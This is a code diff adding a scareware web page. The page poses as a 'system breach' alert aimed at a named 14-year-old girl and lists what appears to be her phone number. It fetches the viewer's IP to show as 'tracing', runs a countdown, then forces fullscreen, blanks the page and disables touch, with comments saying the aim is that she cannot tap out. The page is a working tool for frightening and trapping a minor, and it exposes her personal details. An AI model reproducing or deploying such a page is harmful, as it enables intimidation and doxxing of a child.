@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html style="background:black; color:#0f0; font-family:monospace; height:100%; margin:0; overflow:hidden;">
+<body style="padding:20px;">
+    <h1 style="color:red; text-shadow:0 0 10px red;">[!] SYSTEM BREACH DETECTED</h1>
+    <div style="border:1px solid #0f0; padding:15px;">
+        <p>> TARGET ID: [Chelsea Christopher]</p>
+        <p>> AGE: [14]</p>
+        <p>> PHONE: [07014471669]</p>
+        <p>> STATUS: TRACING IP ADDRESS...</p>
+        <p>> IP: <span id="user-ip" style="color:white; font-weight:bold;">LOCATING...</span></p>
+    </div>
+    <p id="console" style="font-size:11px; color:#555;"></p>
+    <h2 style="color:red;">DEVICE LOCK IN <span id="timer">15</span>s</h2>
+
+<script>
+    // Fetch her IP
+    fetch('https://ipify.org').then(r=>r.json()).then(d=>document.getElementById('user-ip').innerText=d.ip);
+    
+    let count = 15;
+    let timer = setInterval(() => {
+        if(count > 0) {
+            count--;
+            document.getElementById('timer').innerText = count;
+        } else {
+            clearInterval(timer);
+            // THE "ITEL KILL" SEQUENCE
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) { /* Safari/Chrome */
+                elem.webkitRequestFullscreen();
+            }
+            
+            // Turn everything off
+            document.body.innerHTML = ""; 
+            document.body.style.backgroundColor = "black";
+            
+            // Disable touch so she can't easily tap out
+            document.body.style.pointerEvents = "none"; 
+        }
+    }, 1000);
+</script>
+</body>
+</html>
